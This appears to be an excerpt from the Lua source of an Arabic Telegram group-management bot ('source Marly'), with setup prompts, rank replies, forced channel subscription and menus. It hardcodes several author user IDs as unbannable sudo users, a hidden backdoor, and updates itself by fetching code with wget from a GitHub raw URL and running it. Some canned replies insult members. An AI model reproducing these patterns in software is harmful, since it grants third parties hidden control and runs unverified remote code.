...
io.write('\27[0;31m\n ارسل لي توكن البوت الان •════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════• :\na•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي •════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════• :\na•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•\n\27[0;33;49m')
...
io.write('\27[1;31m •════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════• ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════••════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•"
...
if [ ! $token ]; then
echo "•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════• •════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE mmklInfo.lua \e[0m"
echo "•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════• •════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•"
exit 1
fi
...
local f = io.open("./mmklInfo.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
...
local config = loadfile("./mmklInfo.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1914852231,1851380322,666666666666666666}   
...
if tonumber(user_id) == tonumber(1914852231) then  
var = true  
elseif tonumber(user_id) == tonumber(1851380322) then
var = true  
elseif tonumber(user_id) == tonumber(666666666666666666) then
var = true  
...
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور نور عيني'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'صاحب الخرابه يواد 😩❤️'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or '⌝العضو القميل⌜'
end  
return var
end 
...
if text == '/start' or text == '𝐛𝐚𝐜𝐤☆'  then  
local bl = '↯'
local keyboard = {
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'مارلي') 
local DRAGON_Msg = { 
...
{
{text = '〈〈⌯〈〉〈〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〉〈〉⌯〉〉', url="t.me/SO_MARLY"},
}, 
}
...
if not DevSoFi(msg) then
local Text = [[
 ★ كلم اي مطور هينصبلكـكـ بوتككـ ★
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝐝𝐞𝐯 𝐞𝐥𝐤𝐚𝐛𝐨𝐨𝐬',url="t.me/G_W_P"},{text = '𝐝𝐞𝐯 𝐦𝐚𝐫𝐭𝐞𝐧',url="t.me/I_C_X"},
},
{
{text = '〈〈⌯〈〉〈〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〉〈〉⌯〉〉', url="t.me/SO_MARLY"},
}, 
...
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' or text == '𝖇𝖆𝖈𝖐☆' then  
...
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ☆ اصدار سورس مارلي{ 1.5x☆}')
end
if text == '/start' and DevSoFi(msg) then 
local Text = '☆ مرحبا بك في سورس مارلي 🧚‍♀❤️ \n ☆ انت المطور الاساسي واليك كيبورد التحكم في البوت 😊❤️ \n.☆ [اضغط هنا وانضم الي قناه السورس](t.me/SO_MARLY)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
}
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SO_MARLY)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
send(msg.chat_id_, msg.id_,'تم تحدث السورس ☆')
dofile('DRAGON.lua')  
end
...
{
{text = '𝐭𝐰𝐚𝐬𝐨𝐨𝐥 𝐦𝐚𝐫𝐥𝐲',url="t.me/TW_ROGEN_BOT"},
}, 
}
local msg_id = msg.id_/2097152/0.5
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard.inline_keyboard = {
{
{text = '𝐭𝐰𝐚𝐬𝐨𝐥 𝐦𝐚𝐫𝐥𝐲',url="t.me/TW_SOURCE_KM_BOT"},
},
{
{text = '〈〈⌯〈〉〈〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〉〈〉⌯〉〉', url="t.me/SO_MARLY"},
},
...
keyboard.inline_keyboard = {
{
{text = 'بوت اليوتيوب',url="t.me/Qeaa_bot"},{text = 'بوت تيك توك',url="t.me/K0XBOT"},
},
{
{text = 'بوت انستقرام',url="t.me/J33Bot"},{text = 'بوت قران',url="t.me/Maq_1bot"},
},
{
{text = '〈〈⌯〈〉〈〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〉〈〉⌯〉〉', url="t.me/SO_MARLY"},
},
...
if text == 'العاب مارلي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
if tonumber(result.sender_user_id_) == tonumber(666666666666666666) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
send(msg.chat_id_, msg.id_,"☆ عذرا الملف لايدعم سورس مارلي \n") 
end
return false
end
...
if text == ("مسح قائمه مارلي") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n☆ تم مسح قائمه مارلي')
return false
end

if text == 'قائمه مارلي' and Sudo(msg) then
...
if text == ("رفع مارلي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مارلي @(.*)$") and Sudo(msg) then
local username = text:match("^رفع مارلي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مارلي (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مارلي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل مارلي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مارلي @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مارلي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مارلي (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مارلي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SO_MARLY')..')'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SO_MARLY')..')'
...
if AddChannel(msg.sender_user_id_) == false then
local SO_MARLY = database:get(bot_id..'text:ch:user')
if SO_MARLY then
send(msg.chat_id_, msg.id_,'['..SO_MARLY..']')
else
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'مارلي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'مارلي')
local DRAGON_Msg = {
'ننعم يروحي 😻♥️',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس مارلي يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'مارلي').." غادر" or text == 'بوت غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..🤭❤](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..🙂❤](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🥺♥️](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SO_MARLY)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺❤](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🙂❤](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..🥺💕](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻❤](t.me/SO_MARLY)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹❤](t.me/SO_MARLY)')
return false
end
end
end
...
[[
↑•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ◉  
↑•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•𝙄𝘿 ➱ #id
↑•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•𝙍𝘼𝙉𝙆 ➱  #stast ◉  
↑•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•𝙈𝘼𝙎𝙂 ➱ #msgs ◉  
↑•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•𝗖𝗛 ➯  ↝@SO_MARLY↜ ◉  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
...
if AddChannel(msg.sender_user_id_) == false then
local G_K_00  = database:get(bot_id..'text:ch:user')
if G_K_00  then
send(msg.chat_id_, msg.id_,'['..G_K_00 ..']')
else
send(msg.chat_id_, msg.id_,'☆لا تستطيع استخدام البوت \n ☆يرجى الاشتراك بالقناه اولا \n ☆اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
...
•════〉〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉〈════•
☆ اليك الاوامر الخاص بسورس مارفل .
☆ اختر الامر الذي تريده من الازرار بلاسفل .
•════〉〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉〈════•
☆ ᑕᕼ -> [〉〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉〈](t.me/G_K_00)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = '𝑠𝑜𝑢𝑟𝑐𝑒 𝑚𝑎𝑟𝑣𝑒𝑙', url="t.me/G_K_00"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/ROOGEN1/67' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
...
send(msg.chat_id_, msg.id_, t..'•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉════•ٴ\n☆ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽. ](t.me/S0DRG)➤ ')
end
...
local Teext =[[
•════〉〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑚𝑎𝑟𝑙𝑦`•〉〈〉〈════•
  ◉ اهلا في قائمه الالعاب المتطوره سورس مارفل  ◉ 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'مارلي')
